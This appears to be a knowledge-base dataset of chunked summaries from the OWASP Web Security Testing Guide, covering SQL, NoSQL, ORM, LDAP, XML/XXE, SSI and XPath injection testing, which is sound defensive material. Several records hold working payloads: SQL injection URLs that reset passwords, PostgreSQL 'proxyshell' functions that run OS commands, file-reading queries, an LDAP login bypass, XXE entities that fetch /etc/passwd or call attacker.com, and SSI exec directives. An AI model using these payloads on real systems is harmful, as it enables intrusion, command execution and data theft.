{"id": "kb-001173", "section": null, "tags": ["SQLI"], "source": "wstg-v4.2.pdf", "text": "In earlier versions of PostgreSQL, a custom pg_sleep(n) function can be created using libc with the command: CREATE function pg_sleep(int) RETURNS int AS '/lib/libc.so.6', 'sleep' LANGUAGE 'C' STRICT. The chr() function serves to encode strings, allowing for the prevention of single quote escaping in SQL queries. The `chr(n)` function in SQL returns the character whose ASCII value corresponds to the number `n`. The `ascii(n)` function returns the ASCII value that corresponds to the character `n`. To encode the string 'root', individual characters can be converted to their ASCII values: - `select ascii('r')` returns `114` - `select ascii('o')` returns `111` - `select ascii('t')` returns `116` The encoded form of 'root' can be expressed as: `chr(114)||chr(111)||chr(111)||chr(116)`"}
{"id": "kb-001174", "section": null, "tags": ["AUTHN", "HTTP", "SQLI"], "source": "wstg-v4.2.pdf", "text": "Example SQL injection: `http://www.example.com/store.php?id=1; UPDATE users SET PASSWORD=chr(114)||chr(111)||chr(111)||chr(116)--` indicates how SQL injection can be executed to update a password. Users can retrieve their current identity in SQL using statements such as: - `SELECT user` - `SELECT current_user` - `SELECT session_user` - `SELECT usename FROM pg_user` - `SELECT getpgusername()` Example SQL injection to get the current user: `http://www.example.com/store.php?id=1 UNION ALL SELECT user,NULL,NULL--` The function `current_database()` can be used to retrieve the current database name. Example SQL injection to get the current database: `http://www.example.com/store.php?id=1 UNION ALL SELECT current_database(),NULL,NULL--` PostgreSQL allows access to local files via two mechanisms: 1. `COPY` statement - copies data between a file and a table. 2. `pg_read_file()` function (available from PostgreSQL 8.1) - reads a file directly. The `COPY` statement requires the PostgreSQL engine to access the local file system as the `postgres` user."}
{"id": "kb-001175", "section": null, "tags": ["HTTP", "SQLI"], "source": "wstg-v4.2.pdf", "text": "SQL Injection techniques can be performed using UNION Queries. They allow retrieving data from a database by exploiting improperly filtered input variables in a SQL statement."}
{"id": "kb-001176", "section": null, "tags": ["SQLI"], "source": "wstg-v4.2.pdf", "text": "The example demonstrates a series of SQL injection attempts to retrieve data from a table called `file_store` using LIMIT and OFFSET clauses for pagination."}
{"id": "kb-001177", "section": null, "tags": ["SQLI"], "source": "wstg-v4.2.pdf", "text": "The `pg_read_file()` function can read arbitrary files on the database server if permissions allow. An example command is: `SELECT pg_read_file('server.key',0,1000);`"}
{"id": "kb-001178", "section": null, "tags": ["HTTP", "SQLI"], "source": "wstg-v4.2.pdf", "text": "The COPY statement can be used in SQL injection to write to the local file system. For example: `/store.php?id=1; COPY file_store(data) TO '/var/lib/postgresql/copy_output'--` allows writing to the specified path."}
{"id": "kb-001179", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "PostgreSQL has functionality to add custom functions through dynamic libraries. An example of creating a system call is shown with the function syntax: `CREATE FUNCTION system(cstring) RETURNS int AS '/lib/libc.so.6', 'system' LANGUAGE 'C' STRICT`."}
{"id": "kb-001180", "section": null, "tags": ["API", "HTTP", "SQLI"], "source": "wstg-v4.2.pdf", "text": "To capture and retrieve the output of shell commands executed via the `system` function, a table can be created (`stdout(id serial, system_out text)`), and output can be redirected to a file, then copied to this table for retrieval. PL/Python allows users to code PostgreSQL functions in Python, but it is untrusted and thus cannot restrict user actions. To check if PL/Python is enabled, run the SQL query: SELECT count(*) FROM pg_language WHERE lanname='plpythonu'. If PL/Python is not enabled, it can be activated using the command: CREATE LANGUAGE plpythonu."}
{"id": "kb-001181", "section": null, "tags": ["API", "SQLI"], "source": "wstg-v4.2.pdf", "text": "To create a proxy shell function in PL/Python, use: CREATE FUNCTION proxyshell(text) RETURNS text AS 'import os; return os.popen(args[0]).read()' LANGUAGE plpythonu. Example to run an OS command using the proxy shell: /store.php?id=1 UNION ALL SELECT NULL, proxyshell('whoami'), NULL OFFSET 1;-- PL/Perl allows coding PostgreSQL functions in Perl, typically installed as a trusted language to restrict OS interactions. To check if PL/Perl is enabled, use: SELECT count(*) FROM pg_language WHERE lanname='plperlu'. If PL/Perl is not enabled, activate it using: CREATE LANGUAGE plperlu."}
{"id": "kb-001182", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "To create a proxy shell function in PL/Perl, use: CREATE FUNCTION proxyshell(text) RETURNS text AS 'open(FD,\"$_[0] |\");return join(\"\",<FD>);' LANGUAGE plperlu."}
{"id": "kb-001183", "section": null, "tags": ["SQLI"], "source": "wstg-v4.2.pdf", "text": "Example to run an OS command using the proxy shell in PL/Perl: /store.php?id=1 UNION ALL SELECT NULL, proxyshell('whoami'), NULL OFFSET 1;--"}
{"id": "kb-001184", "section": null, "tags": ["AUTHZ", "HTTP", "SQLI"], "source": "wstg-v4.2.pdf", "text": "SQL injection vulnerabilities occur when user-supplied input is used in a SQL query without proper constraints or sanitization, allowing attackers to execute SQL code with the privileges of the database user."}
{"id": "kb-001185", "section": null, "tags": ["INFO"], "source": "wstg-v4.2.pdf", "text": "Fingerprinting is the first step in testing SQL-powered applications by injecting SQL patterns to trigger database exceptions and identify the database management system (DBMS)."}
{"id": "kb-001186", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "In testing MS Access applications, expected error messages include: 'Fatal error: Uncaught exception 'com_exception' with message Source: Microsoft JET Database Engine' and 'Microsoft JET Database Engine error '80040e14'."}
{"id": "kb-001187", "section": null, "tags": ["SQLI"], "source": "wstg-v4.2.pdf", "text": "MS Access has limitations in SQL injection testing, such as not supporting typical operators like comments, stacked queries, and limit operators. Techniques to work around these include the use of alternative methods or combining operators."}
{"id": "kb-001188", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Injecting a 'null' character (%00) can be useful in MS Access, as it causes the database to ignore subsequent characters in a query. This is due to MS Access's internal string representation, which is NULL terminated. However, it can also cause issues if it truncates strings at the web server level, for which a different character (0x16 or %16) may be used as an alternative."}
{"id": "kb-001189", "section": null, "tags": ["HTTP"], "source": "wstg-v4.2.pdf", "text": "The provided SQL query can be influenced or truncated using special characters like ' and functions like %00, which can manipulate how the database interprets the input data."}
{"id": "kb-001190", "section": null, "tags": ["SQLI"], "source": "wstg-v4.2.pdf", "text": "In MS Access, the LIMIT operator is unavailable; instead, the TOP and LAST operators must be used to control result set size: 'SELECT TOP 3 name FROM appsTable'. String concatenation is critical in SQL injection to construct valid queries and can use characters like & (%26) and + (%2b)."}
{"id": "kb-001191", "section": null, "tags": ["SQLI"], "source": "wstg-v4.2.pdf", "text": "Several functions facilitate SQL injection testing, including: ASC (returns ASCII value of a character), CHR (returns character for a given ASCII value), LEN (returns length of a string), IIF (conditional statement), and MID (extracts substring from a string)."}
{"id": "kb-001192", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "The TOP function returns a specified number of rows from the query results, while the LAST function retrieves only the last row of the result set."}
{"id": "kb-001193", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "To enumerate columns in a database, common error-based techniques can be employed by manipulating queries and observing error messages for clues about database structure, such as using 'GROUP BY' statements to reveal column names."}
{"id": "kb-001194", "section": null, "tags": ["API", "CONF"], "source": "wstg-v4.2.pdf", "text": "In MS Access, system tables such as MSysObjects, MSysACEs, and MSysAccessXML might contain metadata about database objects, but accessing them can be restricted in newer configurations."}
{"id": "kb-001195", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Brute forcing the database schema can be done using standard wordlists like FuzzDb, which can help identify database structures and potential vulnerabilities."}
{"id": "kb-001196", "section": null, "tags": ["SQLI"], "source": "wstg-v4.2.pdf", "text": "Exposing the actual .mdb file by including it within the application webroot may allow unauthorized access to the entire database. One way to infer database filenames is by using SQL injection techniques, particularly with a crafted URL to exploit vulnerabilities in web applications."}
{"id": "kb-001197", "section": null, "tags": ["SQLI"], "source": "wstg-v4.2.pdf", "text": "Blind SQL injection (SQLi) is a type of vulnerability where attackers can't see the result of the query. They infer outcomes based on changes in application behavior, such as response times or error messages. Recent versions of MS Access limit the ability to execute shell commands or read/write arbitrary files, making some exploits infeasible."}
{"id": "kb-001198", "section": null, "tags": ["SQLI"], "source": "wstg-v4.2.pdf", "text": "An example of a blind SQL injection attack on an 'id' parameter is provided, illustrating how to construct queries that test for the first character of a username in a database. The specific SQL functions used (IIF, MID, LAST, TOP) allow for extraction of data, even when responses are not directly visible to the attacker."}
{"id": "kb-001199", "section": null, "tags": ["SQLI"], "source": "wstg-v4.2.pdf", "text": "The specific SQL syntax used in blind SQL injections includes combining functions to isolate data based on conditional checks. The use of the 'TOP' function allows the attacker to request a limited number of rows, while 'LAST' helps access specific entries in retrieved records. This method is crucial for narrowing down to the desired piece of information, like the username in a particular row. The page discusses a specific technique related to SQL injection, which is a common web security vulnerability."}
{"id": "kb-001200", "section": null, "tags": ["SQLI"], "source": "wstg-v4.2.pdf", "text": "It provides an example of a SQL injection payload that assesses database values: \"id='%20AND%201=0%20OR%20'a'=IIF((select%20MID(LAST(username),1,1)%20from%20(select%20TOP%2010%20username%20from%20users))='a','a','b')%00\". This payload attempts to determine if the first character of the username in the database matches 'a'."}
{"id": "kb-001201", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "The process mentioned for inferring database values involves two steps: (1) Iterating through all printable values to find a match, (2) Using the LEN function or stopping once all characters are found."}
{"id": "kb-001202", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Time-based blind SQL injections could be employed by using queries that require significant execution time, making them a detection method for verifying vulnerabilities."}
{"id": "kb-001203", "section": null, "tags": ["SQLI"], "source": "wstg-v4.2.pdf", "text": "The page alludes to resources like MS Access SQL injection cheat sheets and articles, which could provide further detail and context for SQL injection techniques."}
{"id": "kb-001204", "section": null, "tags": ["API"], "source": "wstg-v4.2.pdf", "text": "NoSQL databases have looser consistency restrictions compared to traditional SQL databases, allowing for better performance and scalability but also increasing vulnerability to injection attacks."}
{"id": "kb-001205", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "NoSQL injection attacks can execute within a procedural language rather than traditional SQL syntax, potentially leading to greater impacts."}
{"id": "kb-001206", "section": null, "tags": ["API", "HTTP"], "source": "wstg-v4.2.pdf", "text": "Malicious input targeting NoSQL databases may not activate typical application sanitization checks, as common filtering of HTML special characters will not prevent JSON API attacks."}
{"id": "kb-001207", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "There are over 150 NoSQL databases, each with unique APIs, programming languages, and data models, meaning that injection code applicable to one database may not work for another."}
{"id": "kb-001208", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Testing for NoSQL injection requires familiarity with the specific syntax and underlying programming language of the database being examined."}
{"id": "kb-001209", "section": null, "tags": ["API"], "source": "wstg-v4.2.pdf", "text": "Unlike SQL injections, which generally execute within the database engine, NoSQL injections may execute at either the application or database layers depending on API usage and data models."}
{"id": "kb-001210", "section": null, "tags": ["API", "CLIENT", "HTTP"], "source": "wstg-v4.2.pdf", "text": "The MongoDB API accepts BSON calls and includes a secure query assembly tool, but certain parameters allow arbitrary JavaScript input, which can lead to vulnerabilities."}
{"id": "kb-001211", "section": null, "tags": ["CLIENT", "HTTP"], "source": "wstg-v4.2.pdf", "text": "The MongoDB $where operator can be exploited if user input is allowed to manipulate its inclusion. For example, without proper sanitization, an attacker might modify a query to execute arbitrary JavaScript."}
{"id": "kb-001212", "section": null, "tags": ["HTTP"], "source": "wstg-v4.2.pdf", "text": "Example of a vulnerable MongoDB query: `db.myCollection.find( { active: true, $where: function() { return obj.credits - obj.debits < $userInput; } } )`, where `$userInput` is unsanitized user input that could inject harmful code."}
{"id": "kb-001213", "section": null, "tags": ["CLIENT"], "source": "wstg-v4.2.pdf", "text": "Testing for NoSQL vulnerabilities, such as those found in MongoDB, can be demonstrated without fully exploiting the vulnerability by injecting special characters and observing the application’s response. Special characters relevant to MongoDB include: ' \" \\ ; { } which can trigger database errors if not sanitized. JavaScript can be leveraged in NoSQL injection attacks, allowing attackers not only to manipulate data but also to execute arbitrary code."}
{"id": "kb-001214", "section": null, "tags": ["CLIENT", "HTTP"], "source": "wstg-v4.2.pdf", "text": "An example input like '0;var date=new Date(); do{curDate = new Date();}while(curDate-date<10000)' can lead to high CPU usage on a MongoDB instance when executed as JavaScript. MongoDB has specific reserved variable names (e.g., $where) which can be exploited if not properly handled in application code."}
{"id": "kb-001215", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "PHP variable names can conflict with MongoDB reserved operators if the application does not use single quotes around them — this is explicitly warned against in MongoDB documentation."}
{"id": "kb-001216", "section": null, "tags": ["HTTP", "SQLI"], "source": "wstg-v4.2.pdf", "text": "HTTP Parameter Pollution can be used as a method to inject variables such as creating a variable $where to trigger vulnerabilities in MongoDB queries. Object Relational Mapping (ORM) Injection is an attack against an ORM generated data access object model that is akin to SQL Injection."}
{"id": "kb-001217", "section": null, "tags": ["HTTP", "SQLI"], "source": "wstg-v4.2.pdf", "text": "ORM tools facilitate quick generation of an object layer for interacting with relational databases and often provide functions to safeguard SQL Injection. Even with ORM, applications can be vulnerable to SQL Injection if they accept unsanitized input parameters in their methods. To test for ORM Injection vulnerabilities, it's critical first to identify the ORM technology utilized by the application."}
{"id": "kb-001218", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Testing involves understanding the ORM layer's parser and checking for potential vulnerabilities, including reviewing outdated versions of the ORM for known CVEs (Common Vulnerabilities and Exposures)."}
{"id": "kb-001219", "section": null, "tags": ["HTTP"], "source": "wstg-v4.2.pdf", "text": "A vulnerable implementation of ORM is illustrated through code examples that show improper sanitization of input parameters, demonstrating how SQL-related queries can be constructed inadequately, which leads to vulnerabilities."}
{"id": "kb-001220", "section": null, "tags": ["SQLI"], "source": "wstg-v4.2.pdf", "text": "Proper usage of positional parameters in queries (e.g., using '?' in the query string) prevents unsanitized inputs from being executed directly in SQL litmus tests. ORM (Object-Relational Mapping) layers can be vulnerable to security issues just like any other code or third-party library. The sequelize ORM library, a popular npm library, was identified as vulnerable in 2019. Research by RIPS Tech highlighted security bypasses in the hibernate ORM used in Java applications. A cheat sheet is proposed to help testers identify SQL injection issues depending on the DBMS being used."}
{"id": "kb-001221", "section": null, "tags": ["API", "CLIENT", "HTTP", "SQLI"], "source": "wstg-v4.2.pdf", "text": "Example SQL Injection payloads for various databases include: MySQL - \"abc' INTO OUTFILE --\", PostgreSQL - \"$$=’$$=chr(61)\", Oracle - \"NVL(TO_CHAR(DBMS_XMLGEN.getxml('select 1 where 1337>1')),'1')!='1'\", and MS SQL - \"1<LEN(%C2%A0(select%C2%A0top%C2%A01%C2%A0name%C2%A0from%C2%A0users)\". The Laravel Query-Builder was also found to be vulnerable in 2019. Client-side SQL injection occurs with Web SQL Database technology if input is not validated or queries are not parametrized. Web SQL Database is manipulated using JavaScript API calls such as openDatabase(), transaction(), and executeSQL()."}
{"id": "kb-001222", "section": null, "tags": ["CLIENT", "HTTP", "SQLI"], "source": "wstg-v4.2.pdf", "text": "Test objectives for client-side SQL injection include validating proper input validation to safeguard against information being read, modified, or deleted by an attacker."}
{"id": "kb-001223", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "A typical implementation of the Web SQL DB APIs would involve creating or opening a database and then executing SQL commands through transactions. To test for vulnerabilities, assess the presence of executeSQL() and understand SQL syntax used in Web SQL DB, which is based on SQLite."}
{"id": "kb-001224", "section": null, "tags": ["SQLI"], "source": "wstg-v4.2.pdf", "text": "A method of exploiting SQL injection in this context involves manipulating the URL fragment to inject SQL commands, as shown: '15 OR 1=1' allows for retrieving all user data. For further insights, refer to the Testing for SQL Injection scenario for additional payload examples. The Lightweight Directory Access Protocol (LDAP) is employed for storing information regarding users, hosts, and various objects."}
{"id": "kb-001225", "section": null, "tags": ["HTTP"], "source": "wstg-v4.2.pdf", "text": "LDAP injection constitutes a server-side attack potentially revealing, modifying, or inserting sensitive data within an LDAP structure by manipulating input parameters passed to search, add, and modify functions."}
{"id": "kb-001226", "section": null, "tags": ["AUTHN"], "source": "wstg-v4.2.pdf", "text": "Web applications may utilize LDAP to facilitate user authentication or to enable searching for user information within a corporate environment."}
{"id": "kb-001227", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "The primary objective of LDAP injection attacks is to manipulate search filters by injecting LDAP metacharacters into queries executed by the application. RFC 2254 details the formatting of search filters for LDAPv3, succeeding RFC 1960 which applies to LDAPv2."}
{"id": "kb-001228", "section": null, "tags": ["AUTHN"], "source": "wstg-v4.2.pdf", "text": "An LDAP search filter is structured using Polish notation, also known as prefix notation. For instance, the condition find(\"cn=John & userPassword=mypass\") would be represented in LDAP as find(\"(&(cn=John)(userPassword=mypass))\")."}
{"id": "kb-001229", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "In constructing LDAP search filters, several metacharacters are used, including: '&' (Boolean AND), '|' (Boolean OR), '!' (Boolean NOT), '=' (Equals), '~=' (Approx), '>=' (Greater than), '<=' (Less than), '*' (Any character), and '()' (Grouping parentheses). Exploiting LDAP injection vulnerabilities can enable unauthorized access to sensitive content."}
{"id": "kb-001230", "section": null, "tags": ["AUTHN"], "source": "wstg-v4.2.pdf", "text": "LDAP (Lightweight Directory Access Protocol) injection is a type of attack aimed at exploiting vulnerabilities in web applications that utilize LDAP for authentication or data retrieval. Key objectives of LDAP injection testing include identifying injection points and assessing the severity of any found vulnerabilities."}
{"id": "kb-001231", "section": null, "tags": ["HTTP"], "source": "wstg-v4.2.pdf", "text": "Example of LDAP injection: An HTTP request allows an attacker to manipulate the input, changing the search filter. By replacing the 'user' input with '*', they can potentially match all objects with the ‘cn’ attribute. This can reveal sensitive user attributes depending on application permissions."}
{"id": "kb-001232", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Trial-and-error techniques can be employed to test for LDAP injection by inserting various characters such as (, |, &, *, which can lead to errors that indicate a vulnerability."}
{"id": "kb-001233", "section": null, "tags": ["AUTHN", "CRYPTO"], "source": "wstg-v4.2.pdf", "text": "In a login context, if a web application uses LDAP to authenticate user credentials, an attacker could inject a query like '(&(uid=*)(uid=*))(|(uid=*)(userPassword={MD5}X03MO1qnZdYdgyfeuILPmQ==))', which is always true, allowing them to bypass authentication and gain access as the first user in the LDAP tree."}
{"id": "kb-001234", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "XML Injection testing involves injecting an XML document into an application to check if the XML parser can validate data contextually. If it fails, the test is successful. The test objectives for XML Injection include identifying injection points and assessing the types and severities of possible exploits. A web application can utilize XML for user registration, where user data is stored in an XML database (e.g., xmlDB)."}
{"id": "kb-001235", "section": null, "tags": ["AUTHN"], "source": "wstg-v4.2.pdf", "text": "An example structure of xmlDB is provided, showing how user data is structured in XML format with tags such as <username>, <password>, <userid>, and <mail>."}
{"id": "kb-001236", "section": null, "tags": ["HTTP"], "source": "wstg-v4.2.pdf", "text": "During a user registration process through an HTML form, the application processes the user's data using a request format, commonly a GET request. An illustrative example of user input and corresponding request format is given, indicating how data is transmitted. XML Injection vulnerability is tested by attempting to insert XML metacharacters into an application's input fields."}
{"id": "kb-001237", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "XML metacharacters include characters like single quotes ('), which, when not sanitized, can lead to XML parsing exceptions if they form part of tag attribute values."}
{"id": "kb-001238", "section": null, "tags": ["HTTP"], "source": "wstg-v4.2.pdf", "text": "An example of improper input is illustrated by inserting a single quote into an attribute value, which corrupts the XML structure and renders it not well-formed. For instance, inputting the value 'foo'' for an attribute like <node attrib='$inputValue'/> results in <node attrib='foo'/> which is invalid."}
{"id": "kb-001239", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Double quotes can be used similarly to single quotes in XML attributes, but if an attribute value contains a double quote, it can lead to invalid XML, as shown in the given example: <node attrib=\"foo\"\"/> results in an invalid document."}
{"id": "kb-001240", "section": null, "tags": ["HTTP"], "source": "wstg-v4.2.pdf", "text": "Angular parentheses '<' and '>' in user input can disrupt the XML structure, rendering it invalid. For instance, <user> <username>foo<</username> </user> is invalid due to the unclosed '<'."}
{"id": "kb-001241", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "XML comments can be introduced via the sequence <!--/--> causing invalid XML if improperly included in a value. For example, <username>foo<!--</username> is not valid."}
{"id": "kb-001242", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "The ampersand '&' is significant in XML as it denotes the start of an entity. The correct format for entities is &symbol;, where a symbol is replaced by a corresponding Unicode character. An example is using <tagnode>&lt;</tagnode> which represents the '<' character in a valid way."}
{"id": "kb-001243", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "The importance of encoding special characters in XML to prevent injection attacks, such as ensuring that the ampersand (&) is encoded as &amp;."}
{"id": "kb-001244", "section": null, "tags": ["HTTP"], "source": "wstg-v4.2.pdf", "text": "XML injection can occur when user input is not properly sanitized, leading to the creation of invalid XML nodes, such as <user><username>&foo</username>...</user>."}
{"id": "kb-001245", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "CDATA sections (<![CDATA[...]]>) are used in XML to allow for text that includes characters such as < and > to be included without being treated as markup. This means that anything within a CDATA section is not parsed by the XML parser."}
{"id": "kb-001246", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "An example of using CDATA to preserve certain characters in XML is <node><![CDATA[<foo>]]></node>, which prevents <foo> from being treated as a markup tag."}
{"id": "kb-001247", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Injecting a string that contains the end CDATA delimiter (]]>) can lead to invalid XML structure such as <username><![CDATA[]]>]]></username>, demonstrating how this can be exploited in security testing."}
{"id": "kb-001248", "section": null, "tags": ["HTTP", "XSS"], "source": "wstg-v4.2.pdf", "text": "In scenarios where CDATA sections are removed in processing to generate HTML, it can lead to cross-site scripting (XSS) vulnerabilities, as malicious code can be injected and executed when HTML is rendered. Input example for XSS vulnerability: $HTMLCode = <![CDATA[<]]>script<![CDATA[>]]>alert('xss')<![CDATA[<]]>/script<![CDATA[>]]>. Resulting HTML after CDATA processing: <script> alert('XSS') </script>"}
{"id": "kb-001249", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Description of XML External Entity (XXE) vulnerabilities, where an attacker can define new entities that may cause the system to access external resources, leading to potential unauthorized access and denial of service."}
{"id": "kb-001250", "section": null, "tags": ["CLIENT"], "source": "wstg-v4.2.pdf", "text": "Testing for XXE vulnerabilities example: <?xml version=\"1.0\" encoding=\"ISO-8859-1\"?> <!DOCTYPE foo [ <!ELEMENT foo ANY > <!ENTITY xxe SYSTEM \"file:///dev/random\" >]> <foo>&xxe;</foo>. Impacts of XXE attacks: unauthorized file access, local system denial of service, and remote system denial of service. Example tests for file access using XXE: retrieving local files like /etc/passwd or /etc/shadow on UNIX systems and c:/boot.ini on Windows."}
{"id": "kb-001251", "section": null, "tags": ["AUTHZ", "HTTP"], "source": "wstg-v4.2.pdf", "text": "Testing XXE with external URIs: <?xml version=\"1.0\" encoding=\"ISO-8859-1\"?> <!DOCTYPE foo [ <!ELEMENT foo ANY > <!ENTITY xxe SYSTEM \"http://www.attacker.com/text.txt\" >]><foo>&xxe;</foo> The process of XML injection can lead to privilege escalation attacks in web applications."}
{"id": "kb-001252", "section": null, "tags": ["AUTHZ"], "source": "wstg-v4.2.pdf", "text": "Example of an injection attack where a user is inserted with administrative privileges by adding duplicate userid and mail tags, resulting in unauthorized access. Understanding the structure of XML documents is crucial to identifying potential security vulnerabilities. The XML document created after injection can be well-formed, but potential attacks depend on how the document is validated against a DTD."}
{"id": "kb-001253", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "A Doctype Definition (DTD) can prevent attacks by enforcing a specific structure, as seen in the case where the userid tag is defined with cardinality 1, which means it should only appear once per user."}
{"id": "kb-001254", "section": null, "tags": ["AUTHN"], "source": "wstg-v4.2.pdf", "text": "The insertion of XML comment sequences can manipulate XML structures to bypass security checks, as demonstrated in the username and password injection example. The tester can comment out a specific XML node, effectively altering the content of the XML database while still complying with Document Type Definition (DTD) rules."}
{"id": "kb-001255", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "The example provides a direct application of injecting a comment sequence into user data—here, the userid and mail fields can be changed without validation, which could lead to security vulnerabilities if not properly handled."}
{"id": "kb-001256", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "It is crucial to configure certain Java APIs to mitigate risks associated with XML External Entity (XXE) attacks. The APIs listed include: javax.xml.parsers.DocumentBuilder, javax.xml.parsers.DocumentBuilderFactory, org.xml.sax.EntityResolver, and others related to XML parsing."}
{"id": "kb-001257", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Source code reviews should focus on ensuring that docType, external DTDs, and external parameter entities are disallowed in order to prevent XXE vulnerabilities. This is vital for maintaining web application security."}
{"id": "kb-001258", "section": null, "tags": ["API", "CONF"], "source": "wstg-v4.2.pdf", "text": "The structure of the example shows how malicious actors might alter XML documents to fit their needs, and the reliance on proper API configuration to prevent such actions underscores the importance of secure coding practices."}
{"id": "kb-001259", "section": null, "tags": ["HTTP"], "source": "wstg-v4.2.pdf", "text": "XML External Entity (XXE) attacks occur when an application parses XML input and allows an attacker to interfere with the processing of XML data, leading to potential disclosure of confidential data, system denial of service, or server-side request forgery."}
{"id": "kb-001260", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Java POI office reader is identified as potentially vulnerable to XXE when the version is below 3.10.1. This can be verified by examining the JAR filename, such as 'poi-3.8.jar' or 'poi-ooxml-3.8.jar'."}
{"id": "kb-001261", "section": null, "tags": ["HTTP"], "source": "wstg-v4.2.pdf", "text": "Specific source code keywords related to preventing XXE vulnerabilities in C programming include: 'xmlCtxtReadMemory', 'xmlCtxtUseOptions', 'xmlParseInNodeContext', 'xmlReadDoc', 'xmlReadFd', 'xmlReadFile', 'xmlReadIO', 'xmlReadMemory', 'xmlCtxtReadDoc', 'xmlCtxtReadFd', 'xmlCtxtReadFile', 'xmlCtxtReadIO'. In C++, critical functions to avoid XXE vulnerabilities include: 'XercesDOMParser', 'SAXParser', and 'SAX2XMLReader'. Tools such as 'wfuzz' can assist in identifying XML Injection vulnerabilities through the use of specific fuzz strings."}
{"id": "kb-001262", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Server-Side Includes (SSI) are directives parsed by the web server to execute code within static HTML pages, offering a simpler alternative to full server-side languages."}
{"id": "kb-001263", "section": null, "tags": ["CONF"], "source": "wstg-v4.2.pdf", "text": "SSI can lead to Remote Command Execution (RCE) vulnerabilities, especially if server configurations allow the execution of directives that include system commands."}
{"id": "kb-001264", "section": null, "tags": ["HTTP"], "source": "wstg-v4.2.pdf", "text": "A common vulnerability associated with SSI is similar to classical scripting language injection vulnerabilities, and improper user input validation is a key risk factor."}
{"id": "kb-001265", "section": null, "tags": ["HTTP"], "source": "wstg-v4.2.pdf", "text": "To test for SSI injection, security testers should inject SSI directives through user input and assess whether the server executes those directives, indicating a vulnerability."}
{"id": "kb-001266", "section": null, "tags": ["CONF"], "source": "wstg-v4.2.pdf", "text": "To check for SSI support, testers can identify the web server type, look for the presence of .shtml extensions, and search configuration files for SSI-specific keywords."}
{"id": "kb-001267", "section": null, "tags": ["HTTP", "SESSION"], "source": "wstg-v4.2.pdf", "text": "Potential user input vectors for SSI injection include form fields, headers, and cookies; testers should examine how user input is processed and returned within the application."}
{"id": "kb-001268", "section": null, "tags": ["HTTP"], "source": "wstg-v4.2.pdf", "text": "To effectively find SSI injection points, testers can also analyze how input is stored and modified, especially when returned in error messages or page elements."}
{"id": "kb-001269", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "The example provided illustrates how a server can execute directives through Server Side Includes (SSI). An example SSI command to echo a variable is: <!--#echo var=\"VAR\" -->. SSI directives can include files or scripts, as demonstrated with: <!--#include virtual=\"FILENAME\" --> and <!--#exec cmd=\"OS_COMMAND\" -->. If an application is vulnerable, an attacker can inject SSI directives, which will be executed by the server when the page is rendered."}
{"id": "kb-001270", "section": null, "tags": ["HTTP"], "source": "wstg-v4.2.pdf", "text": "SSI directives can also be injected into HTTP headers, potentially compromising the server's response. An example of this injection in headers is shown in the request: GET / HTTP/1.1 Host: www.example.com Referer: <!--#exec cmd=\"/bin/ps ax\"--> User-Agent: <!--#include virtual=\"/proc/version\"-->. Tools mentioned for web security testing include Burp Suite, OWASP ZAP, and grep for string searching. XPath is a language designed for navigating and manipulating XML documents."}
{"id": "kb-001271", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "XPath injection testing seeks to determine if it is possible to inject XPath syntax into application requests, which could allow attackers to execute arbitrary XPath queries."}
{"id": "kb-001272", "section": null, "tags": ["AUTHN", "SQLI"], "source": "wstg-v4.2.pdf", "text": "Successfully exploiting XPath injection vulnerabilities can enable attackers to bypass authentication or gain unauthorized access to sensitive information. Web applications often utilize XML databases, which are queried using XPath, similar to how relational databases utilize SQL. XPath injection attacks share conceptual similarities with SQL injection attacks, making them equally dangerous."}
{"id": "kb-001273", "section": null, "tags": ["API", "AUTHZ"], "source": "wstg-v4.2.pdf", "text": "Unlike SQL, XPath does not enforce Access Control Lists (ACLs), allowing queries to potentially access all parts of an XML document without restrictions."}
{"id": "kb-001274", "section": null, "tags": ["SQLI"], "source": "wstg-v4.2.pdf", "text": "The testing process for XPath injection involves identifying points in an application where XPath queries can be manipulated, similar to standard SQL Injection testing."}
